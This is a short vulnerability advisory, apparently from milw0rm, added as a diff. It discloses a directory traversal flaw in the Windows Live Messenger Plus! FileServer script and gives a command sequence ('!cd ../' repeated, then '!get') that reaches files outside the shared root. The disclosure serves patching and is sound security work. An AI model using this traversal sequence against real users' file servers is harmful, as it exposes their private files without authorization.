@@ -1,0 +1,41 @@
+###########################################
+Windows Live Messenger Plus! FileServer 1.0
+###########################################
+Found by joepie91
+
+
+The FileServer script allows a user using Windows Live Messenger Plus! to share a defined folder and its subfolders and files with a contact.
+Authentication is done using a user-defined username and password.
+I have found a vulnerability in this script, which allows for downloading of EVERY file on the same disk as the defined folder ("root folder"),
+even outside the root folder. The script can be found at http://www.msgpluslive.nl/scripts/view/65-FileServer/
+
+The normal procedure is to use !login to log in, !dir to list files, and !cd to select a folder.
+
+This is an example of a normal communication:
+> !login username password
+< Login succeeded.
+> !dir
+< [directory listing goes here]
+> !cd music
+< OK
+> !get music.mp3
+< [music.mp3 is sent here]
+
+However, when using ../ with the !cd command, you can actually go beyond the root folder.
+This is an example communication (the root directory is C:\shared\files\):
+> !login username password
+< Login succeeded.
+> !cd ../
+< OK
+> !cd ../
+< OK
+> !cd windows
+< OK
+> !dir
+< [here goes a directory listing of C:\windows]
+> !get explorer.exe
+< [client sends back explorer.exe, even though it doesn't have any use]
+
+This very basic vulnerability should be patched as soon as possible, to prevent abuse.
+
+# milw0rm.com [2009-07-09]
